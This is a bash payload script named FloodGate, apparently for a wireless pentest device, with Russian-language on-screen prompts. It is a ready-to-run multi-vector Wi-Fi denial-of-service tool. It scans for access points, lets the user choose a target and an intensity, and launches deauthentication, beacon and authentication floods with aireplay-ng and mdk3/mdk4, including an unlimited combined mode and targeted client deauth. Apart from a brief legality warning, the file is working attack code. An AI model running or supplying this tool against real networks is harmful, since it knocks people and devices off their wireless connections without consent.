#!/bin/bash
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
. /root/payloads/library/nullsec-ui.sh
# Title: FloodGate
# Author: NullSec
# Description: Multi-vector DoS combining deauth, beacon, and auth flood
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/floodgate"
mkdir -p "$LOOT_DIR"

PROMPT "FLOODGATE

Многоуровневый беспроводной
отказ в обслуживании.

Векторы атаки:
- Поток деаут
- Поток маяков
- Поток аутентификации
- Комбинированная атака

ВНИМАНИЕ: Сильно нарушает
незаконно без разрешения.

Нажмите ОК для настройки."

# Check tools
MISSING=""
command -v aireplay-ng >/dev/null 2>&1 || MISSING="${MISSING}aireplay-ng "
command -v mdk3 >/dev/null 2>&1 && HAS_MDK3=1 || HAS_MDK3=0
command -v mdk4 >/dev/null 2>&1 && HAS_MDK4=1 || HAS_MDK4=0

if [ -z "$(command -v aireplay-ng 2>/dev/null)" ] && [ $HAS_MDK3 -eq 0 ] && [ $HAS_MDK4 -eq 0 ]; then
    ERROR_DIALOG "Не найдены инструменты флуда!

Установите:
opkg install aircrack-ng
opkg install mdk3 или mdk4"
    exit 1
fi

# Find monitor interface
MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done
[ -z "$MONITOR_IF" ] && { ERROR_DIALOG "Интерфейс монитора не найден!

airmon-ng start wlan1"; exit 1; }

PROMPT "ВЕКТОР АТАКИ:

1. Деаут-флуд
2. Маяковый флуд
3. Аутентификационный флуд
4. Комбинированный (все три)
5. Целевой деаут

Монитор: $MONITOR_IF

Выберите вектор."

ATTACK_VECTOR=$(NUMBER_PICKER "Вектор (1-5):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) ATTACK_VECTOR=1 ;; esac

# Intensity setting
PROMPT "ИНТЕНСИВНОСТЬ:

1. Низкая (скрытная)
2. Средняя (сбалансированная)
3. Высокая (агрессивная)
4. Максимум (ядерная)

Больше = сильнее нарушение
но более заметно.

Выберите интенсивность."

INTENSITY=$(NUMBER_PICKER "Интенсивность (1-4):" 2)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) INTENSITY=2 ;; esac

case $INTENSITY in
    1) DELAY=100; PACKETS=50;   LABEL="Низкая" ;;
    2) DELAY=50;  PACKETS=200;  LABEL="Средняя" ;;
    3) DELAY=10;  PACKETS=500;  LABEL="Высокая" ;;
    4) DELAY=0;   PACKETS=0;    LABEL="Максимум" ;;
esac

DURATION=$(NUMBER_PICKER "Продолжительность (секунды):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac

# Target selection for targeted attacks
TARGET_BSSID=""
TARGET_CHANNEL=""
if [ "$ATTACK_VECTOR" = "1" ] || [ "$ATTACK_VECTOR" = "4" ] || [ "$ATTACK_VECTOR" = "5" ]; then
    SPINNER_START "Сканирование целей..."
    SCAN_FILE="/tmp/flood_scan_$$.csv"
    timeout 10 airodump-ng "$MONITOR_IF" --output-format csv -w "/tmp/flood_scan_$$" 2>/dev/null &
    sleep 10
    kill %1 2>/dev/null
    wait 2>/dev/null

    TARGETS=$(grep -E "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" "${SCAN_FILE}-01.csv" 2>/dev/null | head -8)
    SPINNER_STOP

    PROMPT "НАЙДЕНЫ ЦЕЛИ:

$(echo "$TARGETS" | awk -F, '{print NR". "$1" ch"$4" "$14}' | head -8)

Введите BSSID цели."

    TARGET_BSSID=$(TEXT_PICKER "BSSID:" "$(echo "$TARGETS" | head -1 | awk -F, '{print $1}' | xargs)")
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED)
        TARGET_BSSID="FF:FF:FF:FF:FF:FF"
        ;;
    esac

    TARGET_CHANNEL=$(echo "$TARGETS" | grep "$TARGET_BSSID" | awk -F, '{print $4}' | xargs)
    TARGET_CHANNEL=${TARGET_CHANNEL:-6}

    # Set channel
    iwconfig "$MONITOR_IF" channel "$TARGET_CHANNEL" 2>/dev/null
    rm -f "${SCAN_FILE}"*
fi

resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ FLOODGATE?

Вектор: $ATTACK_VECTOR
Интенсивность: $LABEL
Продолжительность: ${DURATION}s
Цель: ${TARGET_BSSID:-broadcast}
Канал: ${TARGET_CHANNEL:-all}

ЭТО РАЗРУШИТЕЛЬНО!

Подтвердить?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
FLOOD_LOG="$LOOT_DIR/flood_$TIMESTAMP.log"

LOG "FloodGate: Vector $ATTACK_VECTOR, Intensity $LABEL"
SPINNER_START "FloodGate активен..."

PIDS=""

case $ATTACK_VECTOR in
    1) # Deauth flood
        if [ "$PACKETS" -eq 0 ]; then
            timeout "$DURATION" aireplay-ng --deauth 0 -a "$TARGET_BSSID" "$MONITOR_IF" > "$FLOOD_LOG" 2>&1 &
        else
            timeout "$DURATION" aireplay-ng --deauth "$PACKETS" -a "$TARGET_BSSID" "$MONITOR_IF" > "$FLOOD_LOG" 2>&1 &
        fi
        PIDS="$PIDS $!"
        ;;

    2) # Beacon flood
        if [ $HAS_MDK4 -eq 1 ]; then
            timeout "$DURATION" mdk4 "$MONITOR_IF" b -s "$((1000 / (DELAY + 1)))" > "$FLOOD_LOG" 2>&1 &
        elif [ $HAS_MDK3 -eq 1 ]; then
            timeout "$DURATION" mdk3 "$MONITOR_IF" b > "$FLOOD_LOG" 2>&1 &
        else
            # Fallback: rapid beacon injection via aireplay
            echo "Для маякового флода требуется mdk3/mdk4" > "$FLOOD_LOG"
        fi
        PIDS="$PIDS $!"
        ;;

    3) # Auth flood
        if [ $HAS_MDK4 -eq 1 ]; then
            timeout "$DURATION" mdk4 "$MONITOR_IF" a -a "$TARGET_BSSID" > "$FLOOD_LOG" 2>&1 &
        elif [ $HAS_MDK3 -eq 1 ]; then
            timeout "$DURATION" mdk3 "$MONITOR_IF" a -a "$TARGET_BSSID" > "$FLOOD_LOG" 2>&1 &
        else
            echo "Для аутентификационного флода требуется mdk3/mdk4" > "$FLOOD_LOG"
        fi
        PIDS="$PIDS $!"
        ;;

    4) # Combined assault
        # Deauth
        timeout "$DURATION" aireplay-ng --deauth 0 -a "${TARGET_BSSID:-FF:FF:FF:FF:FF:FF}" "$MONITOR_IF" >> "$FLOOD_LOG" 2>&1 &
        PIDS="$PIDS $!"

        # Beacon flood
        if [ $HAS_MDK4 -eq 1 ]; then
            timeout "$DURATION" mdk4 "$MONITOR_IF" b >> "$FLOOD_LOG" 2>&1 &
            PIDS="$PIDS $!"
        elif [ $HAS_MDK3 -eq 1 ]; then
            timeout "$DURATION" mdk3 "$MONITOR_IF" b >> "$FLOOD_LOG" 2>&1 &
            PIDS="$PIDS $!"
        fi

        # Auth flood
        if [ $HAS_MDK4 -eq 1 ]; then
            timeout "$DURATION" mdk4 "$MONITOR_IF" a -a "${TARGET_BSSID:-FF:FF:FF:FF:FF:FF}" >> "$FLOOD_LOG" 2>&1 &
            PIDS="$PIDS $!"
        elif [ $HAS_MDK3 -eq 1 ]; then
            timeout "$DURATION" mdk3 "$MONITOR_IF" a -a "${TARGET_BSSID:-FF:FF:FF:FF:FF:FF}" >> "$FLOOD_LOG" 2>&1 &
            PIDS="$PIDS $!"
        fi
        ;;

    5) # Targeted deauth (specific client)
        CLIENT_MAC=$(TEXT_PICKER "MAC клиента:" "FF:FF:FF:FF:FF:FF")
        case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) CLIENT_MAC="FF:FF:FF:FF:FF:FF" ;; esac

        timeout "$DURATION" aireplay-ng --deauth 0 -a "$TARGET_BSSID" -c "$CLIENT_MAC" "$MONITOR_IF" > "$FLOOD_LOG" 2>&1 &
        PIDS="$PIDS $!"
        ;;
esac

SPINNER_STOP

PROMPT "FLOODGATE АКТИВЕН!

Vector: $ATTACK_VECTOR
Интенсивность: $LABEL
Продолжительность: ${DURATION}s

Атака выполняется...

Нажмите ОК чтобы дождаться
окончания."

# Wait for all attack processes
for pid in $PIDS; do
    wait "$pid" 2>/dev/null
done

LOG_SIZE=$(wc -l < "$FLOOD_LOG" 2>/dev/null | tr -d ' ')

PROMPT "FLOODGATE ЗАВЕРШЕН

Продолжительность: ${DURATION}s
Строк в логе: $LOG_SIZE

Сохранено: $FLOOD_LOG

Нажмите ОК чтобы выйти."
